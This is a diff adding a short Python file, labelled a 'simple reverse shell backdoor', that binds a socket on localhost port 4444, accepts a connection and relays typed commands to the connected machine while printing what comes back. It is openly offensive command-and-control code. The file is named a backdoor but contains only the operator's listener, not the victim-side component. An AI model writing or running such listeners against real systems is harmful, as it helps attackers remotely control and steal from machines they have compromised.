@@ -1,0 +1,39 @@
+import socket
+import threading
+import subprocess
+
+# Simple reverse shell backdoor
+class Backdoor:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    def start(self):
+        self.server.bind((self.host, self.port))
+        self.server.listen(5)
+        print(f"Backdoor listening on {self.host}:{self.port}")
+        self.client_handler()
+
+    def client_handler(self):
+        client, address = self.server.accept()
+        print(f"Connection from {address}")
+        while True:
+            command = input("Shell> ")
+            if command.lower() == 'exit':
+                client.close()
+                break
+            else:
+                client.send(command.encode())
+                output = client.recv(1024).decode()
+                print(output)
+
+# Function to start the backdoor
+def start_backdoor(host, port):
+    backdoor = Backdoor(host, port)
+    backdoor.start()
+
+# Example usage
+if __name__ == '__main__':
+    # Start the backdoor on localhost port 4444
+    start_backdoor('127.0.0.1', 4444)
